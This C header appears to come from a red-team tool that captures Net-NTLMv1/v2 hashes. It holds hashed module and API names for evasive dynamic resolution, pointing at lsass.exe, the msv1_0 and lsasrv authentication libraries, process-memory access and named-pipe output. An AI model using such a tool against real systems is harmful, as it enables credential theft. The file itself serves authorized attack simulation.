/**
 *
 * Captures incoming Net-NTLMv1/v2 hashes
 * for incoming authentication attempts 
 * via NTLM.
 *
 * GuidePoint Security LLC
 * Threat and Attack Simulation
 *
**/

#pragma once

#define H_STR_DATA			0xb65d0ad /* .data */
#define H_STR_LSASS			0x7384117b /* lsass.exe */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */
#define H_LIB_MSV1_0			0x2c505ec5 /* msv1_0.dll */
#define H_LIB_LSASRV			0xe477fbca /* lsasrv.dll */
#define H_LIB_KERNEL32			0x6ddb9555 /* kernel32.dll */
#define H_API_HEAPWALK			0x4b215612 /* HeapWalk */
#define H_API_HEAPLOCK			0x4b1b884c /* HeapLock */
#define H_API_VSNPRINTF			0xa59022ce /* _vsnprintf */
#define H_API_LOCALFREE			0x32030e92 /* LocalFree */
#define H_API_WRITEFILE			0xf1d207d0 /* WriteFile */
#define H_API_HEAPUNLOCK		0x951029cf /* HeapUnlock */
#define H_API_LOCALALLOC		0x72073b5b /* LocalAlloc */	
#define H_API_OPENPROCESS		0x8b21e0b6 /* OpenProcess */
#define H_API_VIRTUALFREE		0xe144a60e /* VirtualFree */
#define H_API_CLOSEHANDLE		0xfdb928e7 /* CloseHandle */
#define H_API_VIRTUALALLOC		0x097bc257 /* VirtualAlloc */
#define H_API_SPINITIALIZE		0xd95de15a /* SpInirialize */
#define H_API_PROCESS32NEXT		0x8db22608 /* Process32Next */
#define H_API_PROCESS32FIRST		0x43683b31 /* Process32First */
#define H_API_CONNECTNAMEDPIPE		0x436e4c62 /* ConnectNamedPipe */
#define H_API_CREATENAMEDPIPEA		0xa05e2a6d /* CreateNamedPIpeA */
#define H_API_CREATETOOLHELP32SNAPSHOT	0xf37ac035 /* Createtoolhelp32Snapshot */
